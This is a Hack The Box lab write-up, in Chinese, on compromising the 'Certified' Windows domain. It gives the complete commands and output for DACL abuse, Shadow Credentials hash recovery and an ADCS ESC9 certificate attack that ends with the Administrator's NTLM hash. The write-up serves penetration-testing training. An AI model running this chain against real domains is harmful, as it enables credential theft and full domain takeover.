---
layout: post
title: HTB——Certified
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Certified/01.png?raw=true)

# 0x01信息收集

---

Machine Information:As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.5  Expired: 2026.01.01
[04:15:08] [INFO] Start IpScan:10.129.231.186
[04:15:08] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[04:15:08] [+] 10.129.231.186:88 open
[04:15:08] [+] 10.129.231.186:53 open
[04:15:08] [+] 10.129.231.186:135 open
[04:15:08] [+] 10.129.231.186:139 open
[04:15:08] [+] 10.129.231.186:389 open
[04:15:08] [+] 10.129.231.186:464 open
[04:15:08] [+] 10.129.231.186:593 open
[04:15:08] [+] 10.129.231.186:445 open
[04:15:08] [+] 10.129.231.186:636 open
[04:15:09] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.231.186:593 [ncacn_http/1.0]
[04:15:09] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.231.186:389 [0.d.0.0.domainFunctionality1.70.forestFunctionalit]                                                      
[04:15:09] [INFO] start LDAP check 10.129.231.186:389
[04:15:09] [+] 开始 LdapScan 任务: LDAP://10.129.231.186:389
[04:15:09] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.231.186:135 [.@]
[04:15:09] [INFO] start WMI check 10.129.231.186:135
[04:15:09] [+] 开始 WmiExec 任务: WMI://10.129.231.186:135
[04:15:09] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.231.186:139 [.]
[04:15:13] [+] [TCP/KPASSWD5]   10.129.231.186:464 
[04:15:13] [+] [TCP/MICROSOFT-DS]   10.129.231.186:445 
[04:15:13] [INFO] start SMB check 10.129.231.186:445
[04:15:13] [+] 开始 SmbScan 任务: SMB://10.129.231.186:445
[04:15:15] [+] [TCP/SPARK]  [Apache Spark] 10.129.231.186:88 [.]
[04:15:20] [+] 10.129.231.186:3268 open
[04:15:20] [+] 10.129.231.186:3269 open
[04:15:24] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.231.186:3268 [0.d.0.0.domainFunctionality1.70.forestFunctionalit]                                                     
[04:15:24] [INFO] start LDAP check 10.129.231.186:3268
[04:15:24] [+] 开始 LdapScan 任务: LDAP://10.129.231.186:3268
[04:15:28] [+] [TCP/SSL]   10.129.231.186:636 [.M.g I 7.aQ F.)Sj.hP.9.8g.E.L.n g z -.?.(.hb=> /.I]
[04:15:28] [INFO] start LDAPS check 10.129.231.186:636
[04:15:28] [+] 开始 LdapsScan 任务: LDAPS://10.129.231.186:636
[04:15:29] [+] 10.129.231.186:5985 open
[04:15:33] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.231.186:3269 [0.d.0.0.domainFunctionality1.70.forestFunctionalit]                                                     
[04:15:33] [INFO] start LDAP check 10.129.231.186:3269
[04:15:33] [+] 开始 LdapScan 任务: LDAP://10.129.231.186:3269
[04:15:36] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.231.186:5985 [Not Found]
[04:15:36] [INFO] start WinRM check 10.129.231.186:5985
[04:15:36] [+] 开始 WinRMScan 任务: WinRM://10.129.231.186:5985
[04:15:41] [+] 10.129.231.186:9389 open
[04:15:46] [+] [TCP/ADWS]   10.129.231.186:9389 
端口扫描  68% [█████████████░░░░░░░] (44804/65535) [6s:2s]^C26s]
                                                                                                 
┌──(root㉿kali)-[/home/kali]
└─# ./TscanClient_linux_amd64_v2.7.4 -h 10.129.231.186 -p 1-65535 -t 2000

 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.5  Expired: 2026.01.01
[04:18:03] [INFO] Start IpScan:10.129.231.186
[04:18:03] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[04:18:03] [+] 10.129.231.186:53 open
[04:18:03] [+] 10.129.231.186:135 open
[04:18:03] [+] 10.129.231.186:139 open
[04:18:03] [+] 10.129.231.186:88 open
[04:18:03] [+] 10.129.231.186:389 open
[04:18:03] [+] 10.129.231.186:464 open
[04:18:03] [+] 10.129.231.186:445 open
[04:18:04] [+] 10.129.231.186:593 open
[04:18:04] [+] 10.129.231.186:636 open
[04:18:04] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.231.186:389 [0.d.0.0.domainFunctionality1.70.forestFunctionalit]                                                      
[04:18:04] [INFO] start LDAP check 10.129.231.186:389
[04:18:04] [+] 开始 LdapScan 任务: LDAP://10.129.231.186:389
[04:18:04] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.231.186:593 [ncacn_http/1.0]
[04:18:04] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.231.186:139 [.]
[04:18:04] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.231.186:135 [.@]
[04:18:04] [INFO] start WMI check 10.129.231.186:135
[04:18:04] [+] 开始 WmiExec 任务: WMI://10.129.231.186:135
[04:18:08] [+] [TCP/KPASSWD5]   10.129.231.186:464 
[04:18:08] [+] [TCP/MICROSOFT-DS]   10.129.231.186:445 
[04:18:08] [INFO] start SMB check 10.129.231.186:445
[04:18:08] [+] 开始 SmbScan 任务: SMB://10.129.231.186:445
[04:18:10] [+] [TCP/SPARK]  [Apache Spark] 10.129.231.186:88 [.]
[04:18:15] [+] 10.129.231.186:3268 open
[04:18:15] [+] 10.129.231.186:3269 open
[04:18:19] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.231.186:3268 [0.d.0.0.domainFunctionality1.70.forestFunctionalit]                                                     
[04:18:19] [INFO] start LDAP check 10.129.231.186:3268
[04:18:19] [+] 开始 LdapScan 任务: LDAP://10.129.231.186:3268
[04:18:23] [+] [TCP/SSL]   10.129.231.186:636 [.M.g I ..v s.k m.B.' k QF.J.9./.I.F.C0.?0.'.y./| c]
[04:18:23] [INFO] start LDAPS check 10.129.231.186:636
[04:18:23] [+] 开始 LdapsScan 任务: LDAPS://10.129.231.186:636
[04:18:24] [+] 10.129.231.186:5985 open
[04:18:28] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.231.186:3269 [0.d.0.0.domainFunctionality1.70.forestFunctionalit]                                                     
[04:18:28] [INFO] start LDAP check 10.129.231.186:3269
[04:18:28] [+] 开始 LdapScan 任务: LDAP://10.129.231.186:3269
[04:18:31] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.231.186:5985 [Not Found]
[04:18:31] [INFO] start WinRM check 10.129.231.186:5985
[04:18:31] [+] 开始 WinRMScan 任务: WinRM://10.129.231.186:5985
[04:18:37] [+] 10.129.231.186:9389 open
[04:18:41] [+] [TCP/ADWS]   10.129.231.186:9389
```

---

# 0x02 WriteOwner + GenericWrite

---

使用现有服务账户，借助SMB对域内用户枚举一下。

```bash
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.129.231.186 -u  judith.mader -p 'judith09' --rid-brute | grep 'SidTypeUser'
SMB                      10.129.231.186  445    DC01             500: CERTIFIED\Administrator (SidTypeUser)
SMB                      10.129.231.186  445    DC01             501: CERTIFIED\Guest (SidTypeUser)
SMB                      10.129.231.186  445    DC01             502: CERTIFIED\krbtgt (SidTypeUser)
SMB                      10.129.231.186  445    DC01             1000: CERTIFIED\DC01$ (SidTypeUser)
SMB                      10.129.231.186  445    DC01             1103: CERTIFIED\judith.mader (SidTypeUser)
SMB                      10.129.231.186  445    DC01             1105: CERTIFIED\management_svc (SidTypeUser)
SMB                      10.129.231.186  445    DC01             1106: CERTIFIED\ca_operator (SidTypeUser)
SMB                      10.129.231.186  445    DC01             1601: CERTIFIED\alexander.huges (SidTypeUser)
SMB                      10.129.231.186  445    DC01             1602: CERTIFIED\harry.wilson (SidTypeUser)
SMB                      10.129.231.186  445    DC01             1603: CERTIFIED\gregory.cameron (SidTypeUser)
```

然后我们使用`bloodhound-python`收集一下域内的结构信息。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Certified/02.png?raw=true)

可以观察到`judith.mader`对`Management`组具有`WriteOwner`权限。那我们可以将掌握的此账户写为`Management`组内某用户的Owner，或者直接将自己加入此组，再对其账户写入`FullControl`权限。而`management`组对`management_svc`用户具有`GenericWrite`权限，可以考虑打RBCD。首先我们把`management`组的owner写为`judith.mader`,然后`impacket`对`management`具有Fullcontrol

```bash
┌──(root㉿kali)-[/home/kali/HTB/Certified]
└─# bloodyAD -d certified.htb -u judith.mader -p 'judith09' --dc-ip 10.129.231.186 set owner management judith.mader
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on management

┌──(root㉿kali)-[/home/kali]
└─# impacket-dacledit 'certified.htb/judith.mader:judith09' -dc-ip 10.129.231.186 -principal 'judith.mader' -target 'Management' -action write -rights FullControl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250405-050124.bak
[*] DACL modified successfully!
```

然后我们将自己加入到`management`组内

```bash
┌──(root㉿kali)-[/home/kali/HTB/Certified]
└─#  net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S "dc01.certified.htb"
```

接下来利用`GenericWrite`创建`Shadow Creditials`，获取`management_svc`的NTLM hash

```bash
┌──(root㉿kali)-[/home/kali/HTB/Certified/PKINITtools-master]
└─# certipy-ad shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account management_svc -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2cd02ae8-2596-9cd9-aca0-41e5ee9275ad'
[*] Adding Key Credential with device ID '2cd02ae8-2596-9cd9-aca0-41e5ee9275ad' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '2cd02ae8-2596-9cd9-aca0-41e5ee9275ad' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

由于靶机时间不同步原因，我们需要使用`ntpdate ip`来先同步时间。还可以使用`PKINITtools`+`pyWhisker`两个套件完成攻击。下面都会打一遍。

- [奇安信攻防社区-红队域渗透权限维持技术：Shadow Credentials](https://forum.butian.net/share/1607)

```bash
┌──(root㉿kali)-[/home/kali/HTB/Certified/PKINITtools-master]
└─# pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --filename manage_svc
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: bb12931b-9852-885c-0bd3-5c126c8e23fe
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: manage_svc.pfx
[+] PFX exportiert nach: manage_svc.pfx
[i] Passwort für PFX: gvNAa721D3TxQiw5n9u4
[+] Saved PFX (#PKCS12) certificate & key at path: manage_svc.pfx
[*] Must be used with password: gvNAa721D3TxQiw5n9u4
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

获取到了其`pfx`证书，我们再使用`PKINITtools`将pfx换成NTLM

```bash
┌──(root㉿kali)-[/home/kali/HTB/Certified/PKINITtools-master]
└─# python3 gettgtpkinit.py -cert-pfx manage_svc.pfx certified.htb/management_svc -pfx-pass 'l4aG8zUCVMbobjEQkb3H' management_svc.ccache
2025-04-05 12:40:06,720 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-05 12:40:06,749 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-05 12:40:07,020 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-05 12:40:07,020 minikerberos INFO     d356eadb2c0b25b99831f3ba6117f522c697a8f5be04a118a8c41132f49de868
INFO:minikerberos:d356eadb2c0b25b99831f3ba6117f522c697a8f5be04a118a8c41132f49de868
2025-04-05 12:40:07,022 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

最后使用`getnthash`获取到账户的NTLM,注意key就是上文回显的长字符串

```bash
┌──(root㉿kali)-[/home/kali/HTB/Certified/PKINITtools-master]
└─# KRB5CCNAME=management_svc.ccache python3 getnthash.py -key d356eadb2c0b25b99831f3ba6117f522c697a8f5be04a118a8c41132f49de868 certified.htb/management_svc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

使用此NTLM我们就可以上线`management_svc`并获取`user.txt`了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Certified/03.png?raw=true)

---

# 0x03 DACLedit + ADCS ESC9

再次使用bloodhound，使用management_svc的账号查看域内关系，这次我们的重心放在已掌握的management_svc上面。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Certified/04.png?raw=true)

其对于`CA_OPERATOR`具有`GenericAll`权限。除去获得此用户的NTLM，考虑到其控制CA的敏感度，是否可以考虑攻击AD CS来提权？我们先使用certipy-ad来获取一下AD CS的信息

```bash
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad find -enabled -dc-ip 10.129.231.186 -target-ip 10.129.231.186 -ns 10.129.231.186 -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Saved BloodHound data to '20250405131509_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250405131509_Certipy.txt'
[*] Saved JSON output to '20250405131509_Certipy.json'
```

先是老规矩，`editdacl`后创建shadow creditials来获得`CA_OPERATOR`的NTLM。

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-dacledit 'certified.htb/management_svc' -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -principal 'management_svc' -target 'CA_OPERATOR' -action write -rights FullControl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] DACL backed up to dacledit-20250405-131935.bak
[*] DACL modified successfully!


┌──(root㉿kali)-[/home/kali/HTB/Certified]
└─# certipy-ad shadow auto -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -account CA_OPERATOR -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e2dcc0d7-d4ba-af1f-56fa-3612ac2d4153'
[*] Adding Key Credential with device ID 'e2dcc0d7-d4ba-af1f-56fa-3612ac2d4153' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'e2dcc0d7-d4ba-af1f-56fa-3612ac2d4153' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

然后我们使用certipy-ad，来查看域内可用的证书模板。

```bash
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad find -vulnerable -dc-ip 10.129.231.186 -target-ip 10.129.231.186 -ns 10.129.231.186 -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Saved BloodHound data to '20250405135407_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250405135407_Certipy.txt'
[*] Saved JSON output to '20250405135407_Certipy.json'


Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

发现`CertifiedAuthentication`可以用来打`ESC9`。

- [Certificate templates - hacker Recipes](https://legacy.thehacker.recipes/a-d/movement/ad-cs/certificate-templates#no-security-extension-esc9)

首先我们使用`management_svc`账户，将`ca_operator`账户的UserPrincipalName设置为Administrator

```bash
┌──(root㉿kali)-[/home/kali]
└─# certipy-ad account update -username 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -user 'ca_operator' -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

然后我们通过`ca_operator`请求易受攻击的证书。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Certified]
└─# certipy-ad req -username "ca_operator@certified.htb" -hashes b4b86f45c6018f1b664f70805f45d8f2 -target DC01.certified.htb -ca certified-DC01-CA -template 'CertifiedAuthentication' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'DC01.certified.htb' at '192.168.164.2'
[+] Trying to resolve 'CERTIFIED.HTB' at '192.168.164.2'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.231.186[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.231.186[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

最后使用`auth`模块，通过使用pfx证书我们就可以获取到`Administrator`的NTLM hash了。上一步骤需要多实验几次，一次不一定可成功，怀疑是靶机通信有点差了。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Certified]
└─# certipy-ad auth -pfx administrator.pfx -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

获得了NTLM，这台靶机就算是打完了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Certified/05.png?raw=true)

---

# 0x04 总结

非常好的一台靶机，感觉域内的综合性非常强。刨除了边缘web业务打点的功能，转而让用户专门练习域内的各项滥用权限利用手法。就是得注意靶机需要手动取消自动时间同步，不然会出现延时过高票据伪造失败的情况。